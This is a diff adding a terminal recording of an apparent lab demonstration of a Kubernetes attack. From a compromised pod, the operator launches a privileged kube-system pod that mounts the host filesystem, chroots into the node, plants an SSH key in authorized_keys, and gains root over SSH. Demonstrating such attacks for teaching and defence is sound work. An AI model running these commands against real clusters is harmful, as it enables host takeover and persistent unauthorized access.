@@ -1,0 +1,478 @@
+{
+  "version": 1,
+  "width": 90,
+  "height": 25,
+  "duration": 50.112446,
+  "command": "/bin/bash --rcfile ~/.bash_profile",
+  "title": null,
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.000715,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      0.5,
+      "export NODENAME=\"$(kubectl get "
+    ],
+    [
+      5.2e-05,
+      "pods --no-header"
+    ],
+    [
+      0.000333,
+      "s -l 'k8s- \rapp=vulnw"
+    ],
+    [
+      0.00014,
+      "eb' -o=custom-columns=IP:."
+    ],
+    [
+      0.004774,
+      "spec.nodeName)\" && echo $NODENAME\r\n"
+    ],
+    [
+      0.141016,
+      "ip-172-20-63-222.ec2.internal\r\nroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      2.0,
+      "echo \"ExternalIP: $(kubectl get nodes -o custom-co"
+    ],
+    [
+      0.000735,
+      "lumns=N \rame:.status.addresses[?\\(@.type==\\\"ExternalIP\\\"\\)].address -l \"kubernetes.io/hostnam"
+    ],
+    [
+      7.2e-05,
+      "e=$NOD \rENAME\" --no-headers)\""
+    ],
+    [
+      0.859428,
+      "\r\n"
+    ],
+    [
+      0.105422,
+      "ExternalIP: 54.236.27.220\r\nroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      2.0,
+      "cat > masterpod.yml << EOF\r\n> ---\r\n> apiVersion: v1\r\n> kind: Pod\r\n> metadata:\r\n>   name: nginx\r\n>   namespace: kube-system\r\n>   labels:\r\n>     env: prod\r\n> spec:\r\n>   containers:\r\n>   - name: nginx\r\n>     image: nginx\r\n>     securityContext:\r\n>       privileged: true\r\n>     volumeMounts:\r\n>       - name: rootfs\r\n>         mountPath: /rootfs\r\n>   volumes:\r\n>     - name: rootfs\r\n>       hostPath:\r\n>         path: /\r\n>   nodeSelector:\r\n>     kubernetes.io/hostname: $NODENAME\r\n> EOF"
+    ],
+    [
+      1.197184,
+      "\r\nroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.111929,
+      "l"
+    ],
+    [
+      0.054732,
+      "e"
+    ],
+    [
+      0.080045,
+      "a"
+    ],
+    [
+      0.079986,
+      "r"
+    ],
+    [
+      0.086778,
+      "\r\n"
+    ],
+    [
+      0.000751,
+      "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      0.363118,
+      "cat masterpod.yml"
+    ],
+    [
+      0.425786,
+      "\r\n"
+    ],
+    [
+      0.001057,
+      "---\r\napiVersion: v1\r\nkind: Pod\r\nmetadata:\r\n  name: nginx\r\n  namespace: kube-system\r\n  labels:\r\n    env: prod\r\nspec:\r\n  containers:\r\n  - name: nginx\r\n    image: nginx\r\n    securityContext:\r\n      privileged: true\r\n    volumeMounts:\r\n      - name: rootfs\r\n        mountPath: /rootfs\r\n  volumes:\r\n    - name: rootfs\r\n      hostPath:\r\n        path: /\r\n  nodeSelector:\r\n    kubernetes.io/hostname: ip-172-20-63-222.ec2.internal\r\nroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      2.0,
+      "kubectl create -f masterpod.yml"
+    ],
+    [
+      0.367962,
+      "\r\n"
+    ],
+    [
+      0.178956,
+      "pod \"nginx\" created\r\nroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      2.0,
+      "kubectl exec nginx --namespace kube-system -it /usr/sbin/ \rchroot /rootfs /bin/bash"
+    ],
+    [
+      0.577963,
+      "\r\n"
+    ],
+    [
+      0.21009,
+      "root@nginx:/# "
+    ],
+    [
+      2.0,
+      "\r                                                                                         \rroot@nginx:/# cat /home/admin/.ssh/authorized_keys"
+    ],
+    [
+      0.660788,
+      "\r\n"
+    ],
+    [
+      0.000287,
+      "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCugz/eu/a6U5ZXtYVp9ufCghVSP0Lux/nP6BgbranKE6r3h3xgqo8yR2LUG9VwH6Vo+BtGgToeww+jbgr3oq9g8/mQmNvQEefvWyzhYxrpv6q36fdYS0KhQxA6vnpOZZ1M9cZ1q6iPaUryxDUFU3HULDKM4g/6XBzqBJZ2illyuw== kubernetes.kube.lonimbus.com-8a:d5:c3:2b:06:97:b4:6b:b4:3f:97:fa:14:8e:f7:05\r\nroot@nginx:/# "
+    ],
+    [
+      2.0,
+      "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmK\r<AB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmKP                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bBqXVxmWyPObqfZJd0tWOw2JKoWb2m\r<ealSvTy/g9aHyHTKe0xy2WIVmKPBqXVxmWyPObqfZJd0tWOw2JKoWb2m7                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bV69haSa57SxF2f3Aap70BH hi+TjW\r<VxmWyPObqfZJd0tWOw2JKoWb2m7V69haSa57SxF2f3Aap70BH hi+TjW/                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b/ZNHzE8jFyS/vf9e3CNSfFXlNY25c\r<haSa57SxF2f3Aap70BH hi+TjW//ZNHzE8jFyS/vf9e3CNSfFXlNY25cV                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bbPc+b+EXl+pf96ubIt4WtnsoxuoZN\r<HzE8jFyS/vf9e3CNSfFXlNY25cVbPc+b+EXl+pf96ubIt4WtnsoxuoZN0                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b6nC3UHeAWXIh8XJ6TakqjyTzy612Z\r<+b+EXl+pf96ubIt4WtnsoxuoZN06nC3UHeAWXIh8XJ6TakqjyTzy612Zm                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bDQQuQ9qDjPaeGbJbzDytYdSxuSl5m\r<3UHeAWXIh8XJ6TakqjyTzy612ZmDQQuQ9qDjPaeGbJbzDytYdSxuSl5mT                "
+    ],
+    [
+      4.3e-05,
+      "             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\blG4hu87VsZlPHXXISfE7RPNSLQ3Kc\r<uQ9qDjPaeGbJbzDytYdSxuSl5mTlG4hu87VsZlPHXXISfE7RPNSLQ3Kc+                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bhfJkgEtGY/CexkIPgJTJBaI7znUyR\r<hu87VsZlPHXXISfE7RPNSLQ3Kc+hfJkgEtGY/CexkIPgJTJBaI7znUyRt                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bMeA/h5opdNMJlISZnVy5gQDwIaYRY\r<kgEtGY/CexkIPgJTJBaI7znUyRtMeA/h5opdNMJlISZnVy5gQDwIaYRY7                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b3G+oWTh0cVH0cHRGhKYkIB+t8RHNy\r</h5opdNMJlISZnVy5gQDwIaYRY73G+oWTh0cVH0cHRGhKYkIB+t8RHNyD                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\bA+EkLEObicbRF\" >> /home/admin\r<oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF\" >> /home/admin/                             \b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b.ssh/authorized_keys"
+    ],
+    [
+      0.37419,
+      "\r\nroot@nginx:/# "
+    ],
+    [
+      2.0,
+      "cat /home/admin/.ssh/authorized_keys"
+    ],
+    [
+      0.324722,
+      "\r\n"
+    ],
+    [
+      0.000865,
+      "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCugz/eu/a6U5ZXtYVp9ufCghVSP0Lux/nP6BgbranKE6r3h3xgqo8yR2LUG9VwH6Vo+BtGgToeww+jbgr3oq9g8/mQmNvQEefvWyzhYxrpv6q36fdYS0KhQxA6vnpOZZ1M9cZ1q6iPaUryxDUFU3HULDKM4g/6XBzqBJZ2illyuw== kubernetes.kube.lonimbus.com-8a:d5:c3:2b:06:97:b4:6b:b4:3f:97:fa:14:8e:f7:05\r\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmKPBqXVxmWyPObqfZJd0tWOw2JKoWb2m7V69haSa57SxF2f3Aap70BH hi+TjW//ZNHzE8jFyS/vf9e3CNSfFXlNY25cVbPc+b+EXl+pf96ubIt4WtnsoxuoZN06nC3UHeAWXIh8XJ6TakqjyTzy612ZmDQQuQ9qDjPaeGbJbzDytYdSxuSl5mTlG4hu87VsZlPHXXISfE7RPNSLQ3Kc+hfJkgEtGY/CexkIPgJTJBaI7znUyRtMeA/h5opdNMJlISZnVy5gQDwIaYRY73G+oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF\r\nroot@nginx:/# "
+    ],
+    [
+      2.0,
+      "c"
+    ],
+    [
+      0.203182,
+      "l"
+    ],
+    [
+      0.070492,
+      "e"
+    ],
+    [
+      0.055097,
+      "a"
+    ],
+    [
+      0.073085,
+      "r"
+    ],
+    [
+      0.142983,
+      "\r\n"
+    ],
+    [
+      0.000773,
+      "TERM environment variable not set.\r\nroot@nginx:/# "
+    ],
+    [
+      0.997425,
+      "e"
+    ],
+    [
+      0.207821,
+      "x"
+    ],
+    [
+      0.17498,
+      "i"
+    ],
+    [
+      0.08365,
+      "t"
+    ],
+    [
+      0.242561,
+      "\r\nexit\r\n"
+    ],
+    [
+      0.004412,
+      "command terminated with exit code 1\r\nroot@vulnweb-2569941405-kpl6j:/# "
+    ],
+    [
+      1.779035,
+      "e"
+    ],
+    [
+      0.226747,
+      "x"
+    ],
+    [
+      0.290086,
+      "i"
+    ],
+    [
+      0.124023,
+      "t"
+    ],
+    [
+      0.427341,
+      "\r\nexit\r\n"
+    ],
+    [
+      0.002102,
+      "command terminated with exit code 1\r\n"
+    ],
+    [
+      0.03822,
+      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
+    ],
+    [
+      2.0,
+      "ssh"
+    ],
+    [
+      3.2e-05,
+      " -i ~"
+    ],
+    [
+      1.7e-05,
+      "/."
+    ],
+    [
+      1.6e-05,
+      "s"
+    ],
+    [
+      1.5e-05,
+      "s"
+    ],
+    [
+      4.6e-05,
+      "h/k"
+    ],
+    [
+      2.8e-05,
+      "ube"
+    ],
+    [
+      2.4e-05,
+      ".pe"
+    ],
+    [
+      2.4e-05,
+      "m a"
+    ],
+    [
+      2.3e-05,
+      "dm"
+    ],
+    [
+      2.4e-05,
+      "in"
+    ],
+    [
+      2.4e-05,
+      "@5"
+    ],
+    [
+      8.5e-05,
+      "4"
+    ],
+    [
+      5.1e-05,
+      "."
+    ],
+    [
+      3.7e-05,
+      "236"
+    ],
+    [
+      2.3e-05,
+      "."
+    ],
+    [
+      3.4e-05,
+      "2"
+    ],
+    [
+      2.4e-05,
+      "7"
+    ],
+    [
+      2.4e-05,
+      ".2"
+    ],
+    [
+      4.4e-05,
+      "2"
+    ],
+    [
+      4.6e-05,
+      "0"
+    ],
+    [
+      0.719135,
+      "\r\n"
+    ],
+    [
+      0.169174,
+      "\r\nThe programs included with the Debian GNU/Linux system are free software;\r\nthe exact distribution terms for each program are described in the\r\nindividual files in /usr/share/doc/*/copyright.\r\n\r\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\r\npermitted by applicable law.\r\nLast login: Wed Nov 29 20:39:16 2017 from 96.231.30.11\r\r\n"
+    ],
+    [
+      0.0061,
+      "\u001b]0;admin@ip-172-20-63-222: ~\u0007admin@ip-172-20-63-222:~$ "
+    ],
+    [
+      1.799538,
+      "s"
+    ],
+    [
+      0.086855,
+      "u"
+    ],
+    [
+      0.116336,
+      "d"
+    ],
+    [
+      0.05255,
+      "o"
+    ],
+    [
+      0.05255,
+      " "
+    ],
+    [
+      0.108696,
+      "-"
+    ],
+    [
+      0.108696,
+      "i"
+    ],
+    [
+      0.201357,
+      "\r\n"
+    ],
+    [
+      0.025702,
+      "root@ip-172-20-63-222:~# "
+    ],
+    [
+      1.493753,
+      "i"
+    ],
+    [
+      0.055872,
+      "d"
+    ],
+    [
+      0.145699,
+      "\r\n"
+    ],
+    [
+      0.000805,
+      "uid=0(root) gid=0(root) groups=0(root)\r\nroot@ip-172-20-63-222:~# "
+    ],
+    [
+      0.867746,
+      "d"
+    ],
+    [
+      0.066098,
+      "o"
+    ],
+    [
+      0.100825,
+      "c"
+    ],
+    [
+      0.06853,
+      "k"
+    ],
+    [
+      0.100618,
+      "e"
+    ],
+    [
+      0.073213,
+      "r"
+    ],
+    [
+      0.027071,
+      " "
+    ],
+    [
+      0.04799,
+      "p"
+    ],
+    [
+      0.098319,
+      "s"
+    ],
+    [
+      0.128264,
+      "\r\n"
+    ],
+    [
+      0.010083,
+      "CONTAINER ID        IMAGE                                                                                                                          COMMAND                  CREATED             STATUS              PORTS               NAMES"
+    ],
+    [
+      5.1e-05,
+      "\r\na27d0f97bbca        nginx@sha256:b81f317384d7388708a498555c28a7cce778a8f291d90021208b3eba3fe74887                                                  \"nginx -g 'daemon off\"   44 seconds ago      Up 43 seconds                           k8s_nginx_nginx_kube-system_35c2a64f-d546-11e7-9427-06144c1f3cfc_0\r\na6a9f9f15550        gcr.io/google_containers/pause-amd64:3.0                                                                                       \"/pause\"                 45 seconds ago      Up 44 seconds                           k8s_POD_nginx_kube-system_35c2a64f-d546-11e7-9427-06144c1f3cfc_0\r\nd0f0994a4e70        bradgeesaman/vulnapp@sha256:d4dd9e9f5cc247d82ee5624e5127acd13b6458b8fe40b49783d2122a146107ce                                   \"python /app.py\"         40 minutes ago      Up 40 minutes                           k8s_vulnweb_vulnweb-2569941405-kpl6j_default_9620cba7-d540-11e7-9427-06144c1f3cfc_0\r\n1072440f5c90        gcr.io/google_containers/pause-amd64:3.0                                               "
+    ],
+    [
+      0.000184,
+      "                                        \"/pause\"                 41 minutes ago      Up 40 minutes                           k8s_POD_vulnweb-2569941405-kpl6j_default_9620cba7-d540-11e7-9427-06144c1f3cfc_0\r\n9e3f8ec3d8b2        gcr.io/google_containers/k8s-dns-sidecar-amd64@sha256:9aab42bf6a2a068b797fe7d91a5d8d915b10dbbc3d6f2b10492848debfba6044         \"/sidecar --v=2 --log\"   43 minutes ago      Up 43 minutes                           k8s_sidecar_kube-dns-1311260920-l226x_kube-system_cfac59b9-d53f-11e7-9427-06144c1f3cfc_0\r\ne3425ab8be0a        gcr.io/google_containers/k8s-dns-dnsmasq-nanny-amd64@sha256:46b933bb70270c8a02fa6b6f87d440f6f1fce1a5a2a719e164f83f7b109f7544   \"/dnsmasq-nanny -v=2 \"   43 minutes ago      Up 43 minutes                           k8s_dnsmasq_kube-dns-1311260920-l226x_kube-system_cfac59b9-d53f-11e7-9427-06144c1f3cfc_0\r\n8c5336f7abfe        gcr.io/google_containers/k8s-dns-kube-dns-amd64@sha256:1a3fc069de481ae690188f6f1ba4664b5cc7760af37120f70c86505c79eea61d        \"/kube-dns --domain=c\"   43"
+    ],
+    [
+      0.000272,
+      " minutes ago      Up 43 minutes                           k8s_kubedns_kube-dns-1311260920-l226x_kube-system_cfac59b9-d53f-11e7-9427-06144c1f3cfc_0\r\nc5570b2fece0        gcr.io/google_containers/pause-amd64:3.0                                                                                       \"/pause\"                 43 minutes ago      Up 43 minutes                           k8s_POD_kube-dns-1311260920-l226x_kube-system_cfac59b9-d53f-11e7-9427-06144c1f3cfc_0\r\n06dd9467f5b7        calico/cni@sha256:a33d3304c789612612d24ec701a734115903b5ab885dc964a6cc8aa627f5656c                                             \"/install-cni.sh\"        44 minutes ago      Up 44 minutes                           k8s_install-cni_calico-node-q04hz_kube-system_0947a8e1-d540-11e7-9427-06144c1f3cfc_0\r\n36ea343bdc9d        calico/node@sha256:347d618c90f0d6ccc0a1d8a91c8b2f67dcb1494c8e25bd683573c677d6e51477                                            \"start_runit\"            44 minutes ago      Up 44 minutes                           k8s_cali"
+    ],
+    [
+      3.7e-05,
+      "co-node_calico-node-q04hz_kube-system_0947a8e1-d540-11e7-9427-06144c1f3cfc_0\r\n1a51fe1fe229        gcr.io/google_containers/pause-amd64:3.0                                                                                       \"/pause\"                 44 minutes ago      Up 44 minutes                           k8s_POD_calico-node-q04hz_kube-system_0947a8e1-d540-11e7-9427-06144c1f3cfc_0\r\n9815d258874c        gcr.io/google_containers/kube-proxy@sha256:7f65b1b6512a52bf1a9dba8e298468d6fe9021b0cffdc1630c0f708bf8624589                    \"/bin/sh -c 'echo -99\"   48 minutes ago      Up 48 minutes                           k8s_kube-proxy_kube-proxy-ip-172-20-63-222.ec2.internal_kube-system_0276636bc707c0526e61bec34bdb27a8_0\r\n4afa58a1eedf        gcr.io/google_containers/pause-amd64:3.0                                                                                       \"/pause\"                 48 minutes ago      Up 48 minutes                           k8s_POD_kube-proxy-ip-172-20-63-222.ec2.internal_kube-system_0276636"
+    ],
+    [
+      7.4e-05,
+      "bc707c0526e61bec34bdb27a8_0\r\nd2f0c19454ea        protokube:1.7.1                                                                                                                \"/usr/bin/protokube -\"   48 minutes ago      Up 48 minutes                           sick_elion\r\n"
+    ],
+    [
+      3.1e-05,
+      "root@ip-172-20-63-222:~# "
+    ],
+    [
+      1.616541,
+      "logout\r\n"
+    ],
+    [
+      0.001223,
+      "\u001b]0;admin@ip-172-20-63-222: ~\u0007admin@ip-172-20-63-222:~$ "
+    ],
+    [
+      0.182488,
+      "logout\r\n"
+    ]
+  ]
+}
